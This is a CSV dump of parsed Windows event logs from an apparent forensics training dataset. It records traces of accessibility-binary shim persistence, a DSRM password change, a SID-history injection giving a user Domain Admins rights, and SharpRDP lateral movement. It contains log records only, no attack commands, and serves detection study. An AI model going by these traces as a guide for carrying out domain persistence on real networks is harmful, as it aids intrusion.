5,25,2019-03-19 20:52:26.0340368,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3848,4008,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 3848,StartTime: 2019-03-19 20:52:25.9939792,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3848"",""StartTime"":""2019-03-19 20:52:25.9939792"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
6,26,2019-03-19 20:52:47.2144928,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3088,3108,PC01.example.corp,0,S-1-5-21-1587066498-1489273250-1035260531-1106,Application Experience Program Telemetry,,,ProcessId: 3088,StartTime: 2019-03-19 20:52:47.1844496,,,,,C:\Windows\System32\osk.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3088"",""StartTime"":""2019-03-19 20:52:47.1844496"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\System32\\osk.exe"",""FixName"":""CorrectFilePaths""}}}"
7,27,2019-03-19 20:58:31.7499104,500,Info,Microsoft-Windows-Application-Experience,Microsoft-Windows-Application-Experience/Program-Telemetry,3204,1368,PC01.example.corp,0,S-1-5-18,Application Experience Program Telemetry,,,ProcessId: 3204,StartTime: 2019-03-19 20:58:31.7198672,,,,,C:\Windows\system32\utilman.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Persistence_Shime_Microsoft-Windows-Application-Experience_Program-Telemetry_500.evtx,0x1000000000000000,0,"{""UserData"":{""CompatibilityFixEvent"":{""ProcessId"":""3204"",""StartTime"":""2019-03-19 20:58:31.7198672"",""FixID"":""8a23a24a-9a8d-44b6-a6d4-556c53a289b5"",""Flags"":""0x10205"",""ExePath"":""C:\\Windows\\system32\\utilman.exe"",""FixName"":""CorrectFilePaths""}}}"
1,3139859,2017-06-09 19:21:26.9686699,4794,LogAlways,Microsoft-Windows-Security-Auditing,Security,792,1648,2016dc.hqcorp.local,0,,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4794_DSRM_password_change_t1098.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-1913345275-1711810662-261465553-500""},{""@Name"":""SubjectUserName"",""#text"":""administrator""},{""@Name"":""SubjectDomainName"",""#text"":""HQCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0x2F336F""},{""@Name"":""Workstation"",""#text"":""2016DC""},{""@Name"":""Status"",""#text"":""0x0""}]}}"
1,8068,2017-06-12 23:39:43.5129867,4661,LogAlways,Microsoft-Windows-Security-Auditing,Security,496,504,2012r2srv.maincorp.local,0,,Handle requested to an object,MAINCORP\Administrator,,ObjectServer: Security Account Manager,ObjectType: SAM_DOMAIN,"ObjectName: DC=maincorp,DC=local",,,,C:\Windows\System32\lsass.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4765_sidhistory_add_t1178.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2634088540-571122920-1382659128-500""},{""@Name"":""SubjectUserName"",""#text"":""Administrator""},{""@Name"":""SubjectDomainName"",""#text"":""MAINCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0x432C8""},{""@Name"":""ObjectServer"",""#text"":""Security Account Manager""},{""@Name"":""ObjectType"",""#text"":""SAM_DOMAIN""},{""@Name"":""ObjectName"",""#text"":""DC=maincorp,DC=local""},{""@Name"":""HandleId"",""#text"":""0xC9774B43B0""},{""@Name"":""TransactionId"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""AccessList"",""#text"":""%%1537, %%1538, %%1539, %%1540, %%5392, %%5393, %%5394, %%5395, %%5396, %%5397, %%5398, %%5399, %%5400, ""},{""@Name"":""AccessMask"",""#text"":""0x2D""},{""@Name"":""PrivilegeList"",""#text"":""ǿ, -""},{""@Name"":""Properties"",""#text"":""---, {19195a5a-6da0-11d0-afd3-00c04fd930c9}, %%1537, %%1538, %%1539, %%1540, %%5392, %%5393, %%5394, %%5395, %%5396, %%5397, %%5398, %%5399, %%5400, {c7407360-20bf-11d0-a768-00aa006e0529}, {bf9679a4-0de6-11d0-a285-00aa003049e2}, {bf9679a5-0de6-11d0-a285-00aa003049e2}, {bf9679a6-0de6-11d0-a285-00aa003049e2}, {bf9679bb-0de6-11d0-a285-00aa003049e2}, {bf9679c2-0de6-11d0-a285-00aa003049e2}, {bf9679c3-0de6-11d0-a285-00aa003049e2}, {bf967a09-0de6-11d0-a285-00aa003049e2}, {bf967a0b-0de6-11d0-a285-00aa003049e2}, {b8119fd0-04f6-4762-ab7a-4986c76b3f9a}, {bf967a34-0de6-11d0-a285-00aa003049e2}, {bf967a33-0de6-11d0-a285-00aa003049e2}, {bf9679c5-0de6-11d0-a285-00aa003049e2}, {bf967a61-0de6-11d0-a285-00aa003049e2}, {bf967977-0de6-11d0-a285-00aa003049e2}, {bf96795e-0de6-11d0-a285-00aa003049e2}, {bf9679ea-0de6-11d0-a285-00aa003049e2}, {ab721a52-1e2f-11d0-9819-00aa0040529b}, ""},{""@Name"":""RestrictedSidCount"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x1F0""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\lsass.exe""}]}}"
2,8075,2017-06-12 23:39:43.5129867,4765,LogAlways,Microsoft-Windows-Security-Auditing,Security,496,1696,2012r2srv.maincorp.local,0,,,,,,,,,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4765_sidhistory_add_t1178.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SourceUserName"",""#text"":""maincorp.local\\Domain Admins""},{""@Name"":""SourceSid"",""#text"":""S-1-5-21-2634088540-571122920-1382659128-512""},{""@Name"":""TargetUserName"",""#text"":""Andrei""},{""@Name"":""TargetDomainName"",""#text"":""MAINCORP""},{""@Name"":""TargetSid"",""#text"":""S-1-5-21-2634088540-571122920-1382659128-1104""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2634088540-571122920-1382659128-500""},{""@Name"":""SubjectUserName"",""#text"":""Administrator""},{""@Name"":""SubjectDomainName"",""#text"":""MAINCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0x432C8""},{""@Name"":""PrivilegeList"",""#text"":""-""},{""@Name"":""SidList"",""#text"":""-""}]}}"
3,8076,2017-06-12 23:39:43.5129867,4658,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,252,2012r2srv.maincorp.local,0,,The handle to an object was closed,MAINCORP\Administrator,,SID: S-1-5-21-2634088540-571122920-1382659128-500,ObjectServer: Security Account Manager,HandleId: 0xC9774B43B0,,,,C:\Windows\System32\lsass.exe (PID: 0x1F0),False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/4765_sidhistory_add_t1178.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-2634088540-571122920-1382659128-500""},{""@Name"":""SubjectUserName"",""#text"":""Administrator""},{""@Name"":""SubjectDomainName"",""#text"":""MAINCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0x432C8""},{""@Name"":""ObjectServer"",""#text"":""Security Account Manager""},{""@Name"":""HandleId"",""#text"":""0xC9774B43B0""},{""@Name"":""ProcessId"",""#text"":""0x1F0""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\lsass.exe""}]}}"
1,311349,2020-07-09 22:00:11.1813819,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,3892,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 428, ProcessGUID: 747f3d96-85f1-5f07-0000-001074cb0000","RuleName: ",SourceHostname: LAPTOP-JU4M3I0E,SourceIp: 192.168.56.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 192.168.56.101,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:09.694""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-85f1-5f07-0000-001074cb0000""},{""@Name"":""ProcessId"",""#text"":""428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK SERVICE""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.56.1""},{""@Name"":""SourceHostname"",""#text"":""LAPTOP-JU4M3I0E""},{""@Name"":""SourcePort"",""#text"":""52543""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.56.101""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""3389""},{""@Name"":""DestinationPortName"",""#text"":""ms-wbt-server""}]}}"
2,311350,2020-07-09 22:00:14.1249413,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:14.110""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
3,311351,2020-07-09 22:00:14.1953508,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:14.173""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
4,311352,2020-07-09 22:00:17.5840386,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 2568, ProcessGUID: 747f3d96-9371-5f07-0000-00102d024400","RuleName: ","SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 2356, ParentProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\windows\system32\notepad.exe"" ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:17.578""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-9371-5f07-0000-00102d024400""},{""@Name"":""ProcessId"",""#text"":""2568""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\notepad.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.475 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Notepad""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""NOTEPAD.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\windows\\system32\\notepad.exe\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\windows\\system32\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ParentProcessId"",""#text"":""2356""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
5,311353,2020-07-09 22:00:17.5910859,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:17.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
6,311354,2020-07-09 22:00:17.5911376,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a,Details: c:\windows\system32\notepad.exe\1,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:17.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a""},{""@Name"":""Details"",""#text"":""c:\\windows\\system32\\notepad.exe\\1""}]}}"
7,311355,2020-07-09 22:00:17.5911694,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: a,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:17.579""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""a""}]}}"
8,311356,2020-07-09 22:00:27.0330409,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,3892,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 428, ProcessGUID: 747f3d96-85f1-5f07-0000-001074cb0000","RuleName: ",SourceHostname: LAPTOP-JU4M3I0E,SourceIp: 192.168.56.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 192.168.56.101,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:24.591""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-85f1-5f07-0000-001074cb0000""},{""@Name"":""ProcessId"",""#text"":""428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK SERVICE""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""False""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.56.1""},{""@Name"":""SourceHostname"",""#text"":""LAPTOP-JU4M3I0E""},{""@Name"":""SourcePort"",""#text"":""52545""},{""@Name"":""SourcePortName""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.56.101""},{""@Name"":""DestinationHostname"",""#text"":""MSEDGEWIN10""},{""@Name"":""DestinationPort"",""#text"":""3389""},{""@Name"":""DestinationPortName"",""#text"":""ms-wbt-server""}]}}"
9,311357,2020-07-09 22:00:28.3071919,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:28.297""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
10,311358,2020-07-09 22:00:28.4588740,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:28.423""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
11,311359,2020-07-09 22:00:31.2179052,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 7356, ProcessGUID: 747f3d96-937f-5f07-0000-0010ebdd4400","RuleName: ","SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E",ParentProcess: C:\Windows\explorer.exe,"ParentProcessID: 2356, ParentProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700",ParentCommandLine: C:\Windows\Explorer.EXE,"""C:\windows\system32\notepad.exe"" ",False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:31.178""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-937f-5f07-0000-0010ebdd4400""},{""@Name"":""ProcessId"",""#text"":""7356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\notepad.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.475 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Notepad""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""NOTEPAD.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\windows\\system32\\notepad.exe\"" ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\windows\\system32\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-86fa-5f07-0000-00204a8b0600""},{""@Name"":""LogonId"",""#text"":""0x68B4A""},{""@Name"":""TerminalSessionId"",""#text"":""2""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=B6D237154F2E528F0B503B58B025862D66B02B73,MD5=0E61079D3283687D2E279272966AE99D,SHA256=A92056D772260B39A876D01552496B2F8B4610A0B1E084952FE1176784E2CE77,IMPHASH=C8922BE3DCDFEB5994C9EEE7745DC22E""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ParentProcessId"",""#text"":""2356""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\explorer.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\Explorer.EXE""}]}}"
12,311360,2020-07-09 22:00:31.2179963,12,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Object create and delete),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: CreateKey,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""CreateKey""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:31.172""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU""}]}}"
13,311361,2020-07-09 22:00:31.2180228,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,1044,MSEDGEWIN10,0,S-1-5-18,RegistryEvent (Value Set),,,"ProcessID: 2356, ProcessGUID: 747f3d96-86fc-5f07-0000-00101e4b0700","RuleName: ",Image: C:\Windows\Explorer.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-3461203602-4096304019-2269080069-1000\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\MRUList,Details: a,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:31.172""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-86fc-5f07-0000-00101e4b0700""},{""@Name"":""ProcessId"",""#text"":""2356""},{""@Name"":""Image"",""#text"":""C:\\Windows\\Explorer.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-3461203602-4096304019-2269080069-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\MRUList""},{""@Name"":""Details"",""#text"":""a""}]}}"
14,311362,2020-07-09 22:00:40.4131932,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3280,3892,MSEDGEWIN10,0,S-1-5-18,Network connection,NT AUTHORITY\NETWORK SERVICE,,"ProcessID: 428, ProcessGUID: 747f3d96-85f1-5f07-0000-001074cb0000","RuleName: ",SourceHostname: LAPTOP-JU4M3I0E,SourceIp: 192.168.56.1,DestinationHostname: MSEDGEWIN10,DestinationIp: 192.168.56.101,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_sysmon_3_12_13_1_SharpRDP.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-09 22:00:39.116""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-85f1-5f07-0000-001074cb0000""},{""@Name"":""ProcessId"",""#text"":""428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\NETWORK 